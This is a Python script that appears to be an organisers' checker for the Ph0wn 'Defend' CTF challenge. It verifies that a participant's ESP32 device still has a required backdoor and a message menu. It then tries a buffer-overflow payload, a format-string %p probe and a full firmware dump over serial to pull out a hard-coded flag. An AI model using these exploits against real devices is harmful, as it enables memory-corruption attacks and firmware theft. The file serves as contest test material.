#!/usr/bin/env python3

import serial
import time
import argparse
import subprocess
import tempfile
from colorama import Fore
from colorama import Style

FLAG=b'ph0wn{0rganiZers_are_talenT3D}'
PASSWORD=b'onpassepartout!'

def get_arguments():
    parser = argparse.ArgumentParser(description='Exploit scripts for Ph0wn Defend challenge')
    parser.add_argument('-p', '--port', help='Serial port to open', action='store', default='/dev/ttyACM0')
    parser.add_argument('-a', '--all', help='Test all exploits even if the first one works', action='store_true')
    args = parser.parse_args()
    return args

def open_serial(port='/dev/ttyACM0', baudrate=115200, timeout=0.2):
    
    try:
        s = serial.Serial(port=port, baudrate=baudrate, timeout=timeout)
        time.sleep(1) # wait for connection to be established
        if not s.is_open:
            print(f'{Fore.YELLOW}Serial port does not open. {Fore.YELLOW} Check port={port}{Style.RESET_ALL}')
            quit()
        return s
    except serial.SerialException as e:
        print(f'{Fore.YELLOW}Serial port does not open. port={port}, exception={str(e)}.{Style.RESET_ALL}')
        quit()
            
def check_flag(data):
    # data: data we received from
    if FLAG in data:
        print(f'{Fore.RED}Retrieved the flag. 0rganizers win :=) No flag for participants!{Style.RESET_ALL}')
        return True

    if b'ph0wn' in data:
        print(f'{Fore.ORANGE}We have a partial flag? Check manually! {Style.RESET_ALL}')
        if len(data) > 300:
            with tempfile.NamedTemporaryFile(delete=False) as temp_file:
                tempfile.write(data)
                print(f'Dumped to {tempfile.name}')
            
        return False

    print(f'{Fore.GREEN}Unable to retrieve the flag. {Style.RESET_ALL}')
    return False

def select_menu(s, menu=b'1'):
    s.write(b'\n')
    s.read_until(b'Select an option:')
    s.write(menu)
    time.sleep(1) # allow some time for response
    s.read_until(b':') # Wait for "Enter (# to finish): "

def send_payload(s, payload):
    s.write(payload)
    time.sleep(1)
    return s.read_all()

# Compliance tests -------------------------
def test_message_customization(port, message=b'Love Organizers'):
    s = open_serial(port=args.port)
    s.write(b'A')
    time.sleep(1) 
    s.read_until(b'Select an option:')
    s.write(b'1') # select message customization
    time.sleep(1)
    received = s.read_until(b'(# to finish):')
    if b'Enter (# to finish):' in received:
        print(f'{Fore.GREEN}[+] Menu input{Style.RESET_ALL}')
    else:
        print(f'{Fore.RED}NOT COMPLIANT. Menu read input failed: {received}. {Style.RESET_ALL}')
        s.close()
        quit()
        
    s.write(message+b'#')
    time.sleep(1)
    received = s.read_all()
    s.close()
    if message in received:
        print(f'{Fore.GREEN}[+] Customization menu input{Style.RESET_ALL}')
    else:
        print(f'{Fore.RED}[-] NOT COMPLIANT. Customization message failed: {received}. {Style.RESET_ALL}')
        quit()

def test_backdoor(port):
    s = open_serial(port=args.port)
    select_menu(s, menu=b'2')
    received = send_payload(s, PASSWORD + b'#')
    s.close()
    if FLAG in received:
        print(f'{Fore.GREEN}[+] Backdoor works.{Style.RESET_ALL}')
    else:
        print(f'{Fore.RED}[-] NOT COMPLIANT. Backdoor failed: {received}. {Style.RESET_ALL}')
        quit()

# Exploits ---------------------------------

def formatstring(port):
    print('Running formatstring exploit...')
    s = open_serial(port=args.port)
    for i in range(7, 25):
        select_menu(s, menu=b'1')
        received = send_payload(s, b'A '+ b'%p '*i +b'#')
        if check_flag(received):
            s.close()
            return True
    s.close()
    return False

def bof(port):
    print('Running bof exploit...')
    s = open_serial(port=args.port)
    for i in range(20, 35):
        select_menu(s, menu=b'1')
        received = send_payload(s, b'A'*i+ b'\xf6\xff\xff\xff#')
        if check_flag(received):
            s.close()
            return True
    s.close()
    return False

def dump_firmware(port='/dev/ttyACM0', baudrate=1500000):
    print('Dumping the firmware for strings...')
    with tempfile.NamedTemporaryFile(delete=True) as temp_file:
        esptool_command = [
            'esptool.py', '-b', f'{baudrate}', '--port', port, 
            'read_flash', '0x00000', '0x400000', temp_file.name
        ]
        subprocess.run(esptool_command)
        temp_file.seek(0)
        binary_data = temp_file.read()
        ret =  check_flag(binary_data)
    return ret

# MAIN --------------
args = get_arguments()

print('=== Testing compliance ======')
test_message_customization(args.port)
test_backdoor(args.port)
print(f'{Fore.GREEN}[+] Device is compliant. {Style.RESET_ALL}')

print('=== Attacks by 0rganiZers ===')
print('Please press the BUY CHARGE button and then the BOOST button. Raise battery level above 0%.')
input('Click ENTER when done')

bof_test = bof(args.port)
if bof_test and not args.all:
    quit()

format_test = formatstring(args.port)
if format_test and not args.all:
    quit()

if not bof_test and not format_test:
    print(f'{Fore.GREEN}Give FLAG1{Style.RESET_ALL}')    
    
if not dump_firmware(port=args.port):
    print(f'\n{Fore.GREEN}Congrats Give FLAG1 and FLAG2{Style.RESET_ALL}')


    
    

        
        
    

    


